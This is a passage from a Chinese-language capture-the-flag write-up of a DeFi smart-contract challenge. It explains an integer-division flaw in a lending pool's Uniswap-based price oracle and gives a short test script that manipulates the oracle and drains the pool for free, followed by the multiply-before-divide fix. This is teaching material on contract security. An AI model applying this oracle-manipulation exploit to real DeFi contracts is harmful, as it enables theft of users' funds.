    // Fails if the pool doesn't have enough tokens in liquidity
    require(token.transfer(msg.sender, borrowAmount), "Transfer failed");
`}`
```

继续阅读合约的源代码，可以发现 `computeOraclePrice()` 计算过程存在着一定问题，如果 `uniswapOracle.balance &lt; token.balanceOf(uniswapOracle)`，那么得到的结果其实是 0：

```
function computeOraclePrice() public view returns (uint256) `{`
    return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
`}`
```

那么解题的思路非常明确，先通过调用 Uniswap v1 提供的 `tokenToEthSwapInput()` 函数，将我们拥有的部分 token 转换成 ETH，满足 `uniswapOracle.balance &lt; token.balanceOf(uniswapOracle)` 的要求，然后直接调用 `borrow()` 函数，用 0 的代价清空贷款池。编写利用的代码：

```
it('Exploit', async function () `{`
    const deadline = (await web3.eth.getBlock('latest')).timestamp + 300;
    await this.token.approve(this.uniswapExchange.address, ether('0.01'), `{` from: attacker `}`);
    await this.uniswapExchange.tokenToEthSwapInput(ether('0.01'), 1, deadline, `{` from: attacker `}`);
    await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, `{` from: attacker `}`);
`}`);
```

本题的考点非常经典，如果有阅读过现成源代码经历的同学就会意识到，真正正确的做法是将需要转换的币种，先做乘法运算，得到一个较大的数字之后再去做除法运算，这样才能得到一个正确的数字，否则在不存在小数的情况下，很容易得到一个过小的数字（甚至是 0）。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01345b28d204d8c41d.png)



## 总结

这 8 道题目的非常有意思地总结了现有 DeFi 项目在开发过程中可能或已经遇到的问题，以及生态中的一些薄弱点，并将这些知识通过题目的方式展现给了大家。在做完这些题目后，对智能合约的安全，特别是整个 DeFi 生态安全有了更清醒的认识。
